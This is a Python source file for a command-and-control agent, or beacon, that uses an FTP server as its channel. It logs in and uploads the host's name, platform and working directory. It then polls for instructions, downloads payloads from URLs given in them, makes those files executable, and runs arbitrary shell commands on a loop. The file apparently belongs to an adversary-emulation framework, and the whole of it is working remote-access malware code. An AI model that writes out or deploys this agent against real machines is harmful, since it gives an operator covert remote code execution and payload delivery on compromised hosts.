import argparse
import base64
import json
import os
import io
import socket
import subprocess
import stat
import sys
import time

import requests

from ftplib import FTP


class Executor:

    def run(self, i):
        i['pid'] = os.getpid()
        try:
            if i['Executor'] == 'sh':
                i['Response'] = self.bash(i)
            i['Status'] = 0
        except Exception as e:
            i['Response'] = str(e)
            i['Status'] = 1

    @staticmethod
    def bash(request):
        try:
            return subprocess.check_output(request['Request'], shell=True, timeout=120).decode('utf-8', errors='ignore')
        except subprocess.CalledProcessError as e:
            raise Exception(e.output)


class Beacon:

    def __init__(self, host, user, password, jitter):
        self.ftp = FTP(host)
        self.ftp.login(user, password)
        self.ftp.set_pasv(False)
        self.jitter = jitter
        self.beacon = self._build_beacon()
        self.target = None
        self.links = []

    def monitor(self):
        def handle(res):
            self.target = res
            while True:
                self.stor()
                self.retr()
                time.sleep(self.jitter)
        self.ftp.retrlines('RETR target.txt', handle)

    def stor(self):
        payload = json.dumps(dict(Links=self.links, Target=self.target, **self.beacon))
        self.ftp.storlines('STOR %s.json' % socket.gethostname(), io.BytesIO(payload.encode()))
        self.links = []

    def retr(self):
        def handle(res):
            if len(res):
                instructions = json.loads(res)
                for i in instructions['links']:
                    try:
                        if i['Payload']:
                            self._download_payload(name=i['Payload'].split('/')[-1], location=i['Payload'])
                        Executor().run(i)
                    except Exception as e:
                        print('[-] Instruction failed: %s' % e)
                self.links.extend(instructions['links'])
        self.ftp.retrlines('RETR %s.json' % socket.gethostname(), handle)

    @staticmethod
    def _build_beacon():
        return dict(
            Name=socket.gethostname(),
            Location=__file__,
            Platform=sys.platform,
            Executors=['sh'],
            Range='dynamic',
            Pwd=os.getcwd()
        )

    @staticmethod
    def _download_payload(name, location):
        r = requests.get(location)
        with open(name, 'w') as fh:
            fh.write(r.content.decode('utf-8'))
        os.chmod(name, stat.S_IXUSR ^ stat.S_IRUSR ^ stat.S_IWUSR ^ stat.S_IRGRP ^ stat.S_IWGRP)


if __name__ == '__main__':
    parser = argparse.ArgumentParser('Start agent')
    parser.add_argument('-H', '--host', required=False, default='127.0.0.1', help='IP of FTP server')
    parser.add_argument('-U', '--user', required=False, default='user', help='Username to auth')
    parser.add_argument('-P', '--password', required=False, default='password', help='Password to auth')
    parser.add_argument('-J', '--jitter', required=False, default=10)
    args = parser.parse_args()
    Beacon(args.host, args.user, args.password, args.jitter).monitor()